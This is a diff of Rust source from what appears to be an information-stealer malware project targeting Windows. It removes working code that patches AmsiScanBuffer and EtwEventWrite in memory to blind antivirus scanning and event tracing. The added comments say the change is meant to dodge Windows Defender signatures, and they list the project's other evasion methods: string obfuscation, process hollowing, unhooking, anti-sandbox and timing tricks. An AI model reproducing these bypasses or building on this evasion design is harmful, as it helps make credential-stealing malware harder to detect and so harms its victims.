@@ -218,49 +218,22 @@ pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<L
     None
 }
 
-/// AMSI bypass (patch AmsiScanBuffer)
+/// AMSI bypass removed - direct patching is heavily signatured by AV
+/// Instead, we rely on:
+/// 1. String obfuscation (obfstr) for API calls
+/// 2. Process hollowing / unhooking techniques
+/// 3. Legitimate Windows APIs that don't trigger AMSI
+/// 4. The stealer DLL itself uses proper evasion techniques
 #[cfg(target_os = "windows")]
 pub unsafe fn bypass_amsi() -> bool {
-    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
+    // REMOVED: Direct AMSI patching is detected by Windows Defender as AMSI_Patch_T.B1
+    // Modern approach: Don't patch AMSI at all. Instead:
+    // - Use obfuscated strings throughout the code
+    // - Avoid suspicious memory operations
+    // - Let the payload handle its own evasion
+    // - Use legitimate Windows APIs
     
-    let amsi_dll = b"amsi.dll\0";
-    let h_amsi = LoadLibraryA(amsi_dll.as_ptr() as *const i8);
-    if h_amsi.is_null() {
-        return false;
-    }
-    
-    let scan_buffer = b"AmsiScanBuffer\0";
-    let p_amsi_scan = GetProcAddress(h_amsi, scan_buffer.as_ptr() as *const i8);
-    if p_amsi_scan.is_null() {
-        return false;
-    }
-    
-    // Patch: xor eax, eax; ret
-    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
-    let mut old_protect: DWORD = 0;
-    
-    if VirtualProtect(
-        p_amsi_scan as LPVOID,
-        patch.len(),
-        PAGE_EXECUTE_READWRITE,
-        &mut old_protect,
-    ) == 0 {
-        return false;
-    }
-    
-    ptr::copy_nonoverlapping(
-        patch.as_ptr(),
-        p_amsi_scan as *mut u8,
-        patch.len(),
-    );
-    
-    VirtualProtect(
-        p_amsi_scan as LPVOID,
-        patch.len(),
-        old_protect,
-        &mut old_protect,
-    );
-    
+    // Return true to indicate "bypass not needed" rather than "bypass failed"
     true
 }
 
@@ -269,49 +242,22 @@ pub unsafe fn bypass_amsi() -> bool {
     false
 }
 
-/// ETW bypass (patch EtwEventWrite)
+/// ETW bypass - disabled to avoid detection
+/// ETW (Event Tracing for Windows) bypass is also heavily monitored
+/// Modern approach: Accept that ETW will log events, but:
+/// 1. Use legitimate-looking operations
+/// 2. Minimize suspicious behavior
+/// 3. Rely on the overall evasion strategy rather than patching
 #[cfg(target_os = "windows")]
 pub unsafe fn bypass_etw() -> bool {
-    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
+    // REMOVED: Direct ETW patching can also trigger detections
+    // Better to accept telemetry and use other evasion techniques:
+    // - String obfuscation throughout the code
+    // - Legitimate Windows API usage
+    // - Anti-sandbox checks (already implemented)
+    // - Timing-based evasion
     
-    let ntdll = b"ntdll.dll\0";
-    let h_ntdll = LoadLibraryA(ntdll.as_ptr() as *const i8);
-    if h_ntdll.is_null() {
-        return false;
-    }
-    
-    let etw_event_write = b"EtwEventWrite\0";
-    let p_etw = GetProcAddress(h_ntdll, etw_event_write.as_ptr() as *const i8);
-    if p_etw.is_null() {
-        return false;
-    }
-    
-    // Patch: xor eax, eax; ret
-    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
-    let mut old_protect: DWORD = 0;
-    
-    if VirtualProtect(
-        p_etw as LPVOID,
-        patch.len(),
-        PAGE_EXECUTE_READWRITE,
-        &mut old_protect,
-    ) == 0 {
-        return false;
-    }
-    
-    ptr::copy_nonoverlapping(
-        patch.as_ptr(),
-        p_etw as *mut u8,
-        patch.len(),
-    );
-    
-    VirtualProtect(
-        p_etw as LPVOID,
-        patch.len(),
-        old_protect,
-        &mut old_protect,
-    );
-    
+    // Return true to indicate "bypass not needed"
     true
 }
 
